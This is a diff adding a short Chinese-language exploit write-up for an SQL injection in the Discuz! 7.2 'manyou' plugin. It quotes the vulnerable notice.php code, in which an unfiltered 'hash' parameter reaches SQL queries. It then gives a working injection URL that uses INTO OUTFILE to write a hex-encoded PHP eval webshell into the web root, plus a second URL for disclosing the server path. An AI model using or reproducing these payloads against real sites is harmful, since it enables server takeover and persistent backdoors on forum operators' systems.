@@ -1,0 +1,32 @@
+discuz! 7.2 manyou插件暴路径&Get Webshell 0day
+
+
+在最新的discuz! 7.2中自带了一个新的应用程序插件manyou。恰恰在这个新插件中，没有对传入的参数进行检查，在GPC为off的情况下，导致注入漏洞的产生。
+漏洞分析：
+文件./manyou/sources/notice.php
+相关代码：
+if($option == 'del') {
+$appid = intval($_GET['appid']);
+$db->query("DELETE FROM {$tablepre}myinvite WHERE appid='$appid' AND touid='$discuz_uid'");
+showmessage('manyou:done', 'userapp.php?script=notice&action=invite');
+} elseif($option == 'deluserapp') {
+$hash = trim($_GET['hash']); //此处并没有进行过滤，直接导致注入的产生
+if($action == 'invite') { 
+$query = $db->query("SELECT * FROM {$tablepre}myinvite WHERE hash='$hash' AND touid='$discuz_uid'");
+if($value = $db->fetch_array($query)) {
+$db->query("DELETE FROM {$tablepre}myinvite WHERE hash='$hash' AND touid='$discuz_uid'");
+showmessage('manyou:done', 'userapp.php?script=notice&action=invite');
+} else {
+showmessage('manyou:noperm');
+}
+} else {
+$db->query("DELETE FROM {$tablepre}mynotice WHERE id='$hash' AND uid='$discuz_uid'");
+showmessage('manyou:done', 'userapp.php?script=notice');
+}
+}
+很简单的一个漏洞。在没有查询结果返回的情况下我们往往只有采取盲注的方式，但如果当前数据库帐号有File_priv的话我们也可以直接into outfile。
+/userapp.php?script=notice&view=all&option=deluserapp&action=invite&hash=' union select NULL,NULL,NULL,NULL,0x3C3F70687020406576616C28245F504F53545B274F275D293B3F3E,NULL,NULL,NULL,NULL into outfile 'C:/inetpub/wwwroot/shell.php'%23
+
+/manyou/admincp.php?my_suffix=%0A%0DTOBY57 爆路径
+
+
